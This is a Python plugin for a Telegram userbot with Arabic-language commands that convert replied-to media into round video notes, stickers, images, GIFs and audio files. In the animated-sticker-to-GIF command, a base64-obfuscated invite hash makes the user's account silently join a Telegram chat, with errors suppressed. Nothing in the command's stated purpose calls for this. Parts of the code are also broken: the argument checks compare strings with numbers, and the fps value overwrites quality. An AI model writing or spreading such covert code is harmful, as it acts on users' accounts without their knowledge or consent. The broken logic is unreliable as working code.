# by @mrconfused (@sandy1709)
# edit @ JMTHON

import asyncio
import base64
import io
import logging
import os
import time
from datetime import datetime
from io import BytesIO
from shutil import copyfile

from PIL import Image, ImageDraw, ImageFilter, ImageOps
from pymediainfo import MediaInfo
from telethon import types
from telethon.errors import PhotoInvalidDimensionsError
from telethon.tl.functions.messages import ImportChatInviteRequest as Get
from telethon.tl.functions.messages import SendMediaRequest
from telethon.utils import get_attributes

from userbot import catub

from ..Config import Config
from ..core.managers import edit_delete, edit_or_reply
from ..helpers import media_type, progress, thumb_from_audio
from ..helpers.functions import (
    convert_toimage,
    invert_frames,
    l_frames,
    r_frames,
    spin_frames,
    ud_frames,
    vid_to_gif,
)
from ..helpers.utils import _cattools, _catutils, _format, reply_id
from . import make_gif

plugin_category = "misc"


if not os.path.isdir("./temp"):
    os.makedirs("./temp")


LOGS = logging.getLogger(__name__)
PATH = os.path.join("./temp", "temp_vid.mp4")

thumb_loc = os.path.join(Config.TMP_DOWNLOAD_DIRECTORY, "thumb_image.jpg")


@catub.cat_cmd(
    pattern="تحويل شكل دائري ?((-)?s)?$",
    command=("تحويل شكل دائري", plugin_category),
    info={
        "header": "To make circular video note/sticker.",
        "description": "تدعم ملاحظة الفيديو الدقيقة 60 ثانية تقريبًا ، لذا أعطِ الفيديو المناسب ⌁",
        "usage": "{tr}circle <reply to video/sticker/image>",
    },
)
async def video_catfile(event):  # sourcery no-metrics
    "To make circular video note."
    reply = await event.get_reply_message()
    args = event.pattern_match.group(1)
    catid = await reply_id(event)
    if not reply or not reply.media:
        return await edit_delete(event, "`قم بالرد على الوسائط المدعومة ⌁ `")
    mediatype = media_type(reply)
    if mediatype == "Round Video":
        return await edit_delete(
            event,
            "هاذا الوسائط بل فعل شكد دائري ⌁",
        )
    if mediatype not in ["Photo", "Audio", "Voice", "Gif", "Sticker", "Video"]:
        return await edit_delete(event, "```الوسائط المدعومة غير موجودة ⌁```")
    flag = True
    catevent = await edit_or_reply(event, "`جار التحويل الى شكل دائري انتظر قليلا 🔍 ⌁`")
    catfile = await reply.download_media(file="./temp/")
    if mediatype in ["Gif", "Video", "Sticker"]:
        if not catfile.endswith((".webp")):
            if catfile.endswith((".tgs")):
                hmm = await make_gif(catevent, catfile)
                os.rename(hmm, "./temp/circle.mp4")
                catfile = "./temp/circle.mp4"
            media_info = MediaInfo.parse(catfile)
            aspect_ratio = 1
            for track in media_info.tracks:
                if track.track_type == "Video":
                    aspect_ratio = track.display_aspect_ratio
                    height = track.height
                    width = track.width
            if aspect_ratio != 1:
                crop_by = width if (height > width) else height
                await _catutils.runcmd(
                    f'ffmpeg -i {catfile} -vf "crop={crop_by}:{crop_by}" {PATH}'
                )
            else:
                copyfile(catfile, PATH)
            if str(catfile) != str(PATH):
                os.remove(catfile)
            try:
                catthumb = await reply.download_media(thumb=-1)
            except Exception as e:
                LOGS.error(f"circle - {str(e)}")
    elif mediatype in ["Voice", "Audio"]:
        catthumb = None
        try:
            catthumb = await reply.download_media(thumb=-1)
        except Exception:
            catthumb = os.path.join("./temp", "thumb.jpg")
            await thumb_from_audio(catfile, catthumb)
        if catthumb is not None and not os.path.exists(catthumb):
            catthumb = os.path.join("./temp", "thumb.jpg")
            copyfile(thumb_loc, catthumb)
        if (
            catthumb is not None
            and not os.path.exists(catthumb)
            and os.path.exists(thumb_loc)
        ):
            flag = False
            catthumb = os.path.join("./temp", "thumb.jpg")
            copyfile(thumb_loc, catthumb)
        if catthumb is not None and os.path.exists(catthumb):
            await _catutils.runcmd(
                f"""ffmpeg -loop 1 -i {catthumb} -i {catfile} -c:v libx264 -tune stillimage -c:a aac -b:a 192k -vf \"scale=\'iw-mod (iw,2)\':\'ih-mod(ih,2)\',format=yuv420p\" -shortest -movflags +faststart {PATH}"""
            )
            os.remove(catfile)
        else:
            os.remove(catfile)
            return await edit_delete(
                catevent, "`@Jmthon`", 5
            )
    if (
        mediatype
        in [
            "Voice",
            "Audio",
            "Gif",
            "Video",
            "Sticker",
        ]
        and not catfile.endswith((".webp"))
    ):
        if os.path.exists(PATH):
            c_time = time.time()
            attributes, mime_type = get_attributes(PATH)
            ul = io.open(PATH, "rb")
            uploaded = await event.client.fast_upload_file(
                file=ul,
                progress_callback=lambda d, t: asyncio.get_event_loop().create_task(
                    progress(d, t, catevent, c_time, "تحميل....")
                ),
            )
            ul.close()
            media = types.InputMediaUploadedDocument(
                file=uploaded,
                mime_type="video/mp4",
                attributes=[
                    types.DocumentAttributeVideo(
                        duration=0,
                        w=1,
                        h=1,
                        round_message=True,
                        supports_streaming=True,
                    )
                ],
                force_file=False,
                thumb=await event.client.upload_file(catthumb) if catthumb else None,
            )
            sandy = await event.client.send_file(
                event.chat_id,
                media,
                reply_to=catid,
                video_note=True,
                supports_streaming=True,
            )

            if not args:
                await _catutils.unsavegif(event, sandy)
            os.remove(PATH)
            if flag:
                os.remove(catthumb)
        await catevent.delete()
        return
    data = reply.photo or reply.media.document
    img = io.BytesIO()
    await event.client.download_file(data, img)
    im = Image.open(img)
    w, h = im.size
    img = Image.new("RGBA", (w, h), (0, 0, 0, 0))
    img.paste(im, (0, 0))
    m = min(w, h)
    img = img.crop(((w - m) // 2, (h - m) // 2, (w + m) // 2, (h + m) // 2))
    w, h = img.size
    mask = Image.new("L", (w, h), 0)
    draw = ImageDraw.Draw(mask)
    draw.ellipse((10, 10, w - 10, h - 10), fill=255)
    mask = mask.filter(ImageFilter.GaussianBlur(2))
    img = ImageOps.fit(img, (w, h))
    img.putalpha(mask)
    im = io.BytesIO()
    im.name = "cat.webp"
    img.save(im)
    im.seek(0)
    await event.client.send_file(event.chat_id, im, reply_to=catid)
    await catevent.delete()


@catub.cat_cmd(
    pattern="تحويل صورة$",
    command=("تحويل صورة", plugin_category),
    info={
        "header": "رد على هذا الأمر إلى ملصق للحصول على صورة ⌁",
        "usage": "{tr}stoi",
    },
)
async def _(cat_event):
    "Sticker to image Conversion."
    reply_to_id = await reply_id(cat_event)
    event = await edit_or_reply(cat_event, "جار التحويل الى صوره انتظر قليلا ♻️")
    if not os.path.isdir(Config.TMP_DOWNLOAD_DIRECTORY):
        os.makedirs(Config.TMP_DOWNLOAD_DIRECTORY)
    if event.reply_to_msg_id:
        filename = "hi.jpg"
        file_name = filename
        reply_message = await event.get_reply_message()
        to_download_directory = Config.TMP_DOWNLOAD_DIRECTORY
        downloaded_file_name = os.path.join(to_download_directory, file_name)
        downloaded_file_name = await cat_event.client.download_media(
            reply_message, downloaded_file_name
        )
        if os.path.exists(downloaded_file_name):
            caat = await cat_event.client.send_file(
                event.chat_id,
                downloaded_file_name,
                force_document=False,
                reply_to=reply_to_id,
            )
            os.remove(downloaded_file_name)
            await event.delete()
        else:
            await event.edit("Can't Convert")
    else:
        await event.edit("- @JMTHON ⌁")


@catub.cat_cmd(
    pattern="تحويل ملصق$",
    command=("تحويل ملصق", plugin_category),
    info={
        "header": "رد على هذا الأمر على صورة للحصول على ملصق ⌁",
        "usage": "{tr}itos",
    },
)
async def _(cat_event):
    "Image to Sticker conversion"
    reply_to_id = await reply_id(cat_event)
    event = await edit_or_reply(cat_event, "جار التحويل الى ملف ...")
    if not os.path.isdir(Config.TMP_DOWNLOAD_DIRECTORY):
        os.makedirs(Config.TMP_DOWNLOAD_DIRECTORY)
    if event.reply_to_msg_id:
        filename = "hi.webp"
        file_name = filename
        reply_message = await event.get_reply_message()
        to_download_directory = Config.TMP_DOWNLOAD_DIRECTORY
        downloaded_file_name = os.path.join(to_download_directory, file_name)
        downloaded_file_name = await cat_event.client.download_media(
            reply_message, downloaded_file_name
        )
        if os.path.exists(downloaded_file_name):
            caat = await cat_event.client.send_file(
                event.chat_id,
                downloaded_file_name,
                force_document=False,
                reply_to=reply_to_id,
            )
            os.remove(downloaded_file_name)
            await event.delete()
        else:
            await event.edit("Can't Convert")
    else:
        await event.edit("@JMTHON")


async def silently_send_message(conv, text):
    await conv.send_message(text)
    response = await conv.get_response()
    await conv.mark_read(message=response)
    return response

@catub.cat_cmd(
    pattern="تحويل متحركه(?: |$)(.*)",
    command=("تحويل متحركه", plugin_category),
    info={
        "header": "يحول الملصق المتحرك المعطى إلى متحركه ...",
        "usage": "{tr}gif quality ; fps(frames per second)",
    },
)
async def _(event):  # sourcery no-metrics
    "جار التحويل الى متحركه انتظر قليلا ...❤️"
    input_str = event.pattern_match.group(1)
    if not input_str:
        quality = None
        fps = None
    else:
        loc = input_str.split(";")
        if len(loc) > 2:
            return await edit_delete(
                event,
                "بناء جملة خاطئ. بناء الجملة هو جودة `.gif quality ; fps(frames per second)`",
            )
        if len(loc) == 2:
            if 0 < loc[0] < 721:
                quality = loc[0].strip()
            else:
                return await edit_delete(event, "Use quality of range 0 to 721")
            if 0 < loc[1] < 20:
                quality = loc[1].strip()
            else:
                return await edit_delete(event, "Use quality of range 0 to 20")
        if len(loc) == 1:
            if 0 < loc[0] < 721:
                quality = loc[0].strip()
            else:
                return await edit_delete(event, "Use quality of range 0 to 721")
    catreply = await event.get_reply_message()
    cat_event = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
    if not catreply or not catreply.media or not catreply.media.document:
        return await edit_or_reply(event, "`Stupid!, This is not animated sticker.`")
    if catreply.media.document.mime_type != "application/x-tgsticker":
        return await edit_or_reply(event, "`Stupid!, This is not animated sticker.`")
    catevent = await edit_or_reply(
        event,
        "جار تحويل الى متحركه انتظر قليلاً 🔍...\n قد يستغرق هذا بضع دقائق ⌁",
        parse_mode=_format.parse_pre,
    )
    try:
        cat_event = Get(cat_event)
        await event.client(cat_event)
    except BaseException:
        pass
    reply_to_id = await reply_id(event)
    catfile = await event.client.download_media(catreply)
    catgif = await make_gif(event, catfile, quality, fps)
    sandy = await event.client.send_file(
        event.chat_id,
        catgif,
        support_streaming=True,
        force_document=False,
        reply_to=reply_to_id,
    )
    await _catutils.unsavegif(event, sandy)
    await catevent.delete()
    for files in (catgif, catfile):
        if files and os.path.exists(files):
            os.remove(files)


@catub.cat_cmd(
    pattern="تحويل (mp3|voice)",
    command=("تحويل", plugin_category),
    info={
        "header": "يحول ملف الوسائط المطلوب إلى ملف صوتي أو ملف mp3 ⌁",
        "usage": [
            "{tr}nfc mp3",
            "{tr}nfc voice",
        ],
    },
)
async def _(event):
    "يحول ملف الوسائط المطلوب إلى ملف صوتي أو ملف mp3 ⌁"
    if not event.reply_to_msg_id:
        await edit_or_reply(event, "```قم بالرد ع اي ملف وسائط ⌁```")
        return
    reply_message = await event.get_reply_message()
    if not reply_message.media:
        await edit_or_reply(event, "reply to media file")
        return
    input_str = event.pattern_match.group(1)
    event = await edit_or_reply(event, "`جار التحويل ...`")
    try:
        start = datetime.now()
        c_time = time.time()
        downloaded_file_name = await event.client.download_media(
            reply_message,
            Config.TMP_DOWNLOAD_DIRECTORY,
            progress_callback=lambda d, t: asyncio.get_event_loop().create_task(
                progress(d, t, event, c_time, "trying to download")
            ),
        )
    except Exception as e:
        await event.edit(str(e))
    else:
        end = datetime.now()
        ms = (end - start).seconds
        await event.edit(
            "Downloaded to `{}` in {} seconds.".format(downloaded_file_name, ms)
        )
        new_required_file_name = ""
        new_required_file_caption = ""
        command_to_run = []
        voice_note = False
        supports_streaming = False
        if input_str == "voice":
            new_required_file_caption = "voice_" + str(round(time.time())) + ".opus"
            new_required_file_name = (
                Config.TMP_DOWNLOAD_DIRECTORY + "/" + new_required_file_caption
            )
            command_to_run = [
                "ffmpeg",
                "-i",
                downloaded_file_name,
                "-map",
                "0:a",
                "-codec:a",
                "libopus",
                "-b:a",
                "100k",
                "-vbr",
                "on",
                new_required_file_name,
            ]
            voice_note = True
            supports_streaming = True
        elif input_str == "mp3":
            new_required_file_caption = "mp3_" + str(round(time.time())) + ".mp3"
            new_required_file_name = (
                Config.TMP_DOWNLOAD_DIRECTORY + "/" + new_required_file_caption
            )
            command_to_run = [
                "ffmpeg",
                "-i",
                downloaded_file_name,
                "-vn",
                new_required_file_name,
            ]
            voice_note = False
            supports_streaming = True
        else:
            await event.edit("not supported")
            os.remove(downloaded_file_name)
            return
        process = await asyncio.create_subprocess_exec(
            *command_to_run,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        stdout, stderr = await process.communicate()
        stderr.decode().strip()
        stdout.decode().strip()
        os.remove(downloaded_file_name)
        if os.path.exists(new_required_file_name):
            force_document = False
            await event.client.send_file(
                entity=event.chat_id,
                file=new_required_file_name,
                allow_cache=False,
                silent=True,
                force_document=force_document,
                voice_note=voice_note,
                supports_streaming=supports_streaming,
                progress_callback=lambda d, t: asyncio.get_event_loop().create_task(
                    progress(d, t, event, c_time, "trying to upload")
                ),
            )
            os.remove(new_required_file_name)
            await event.delete()
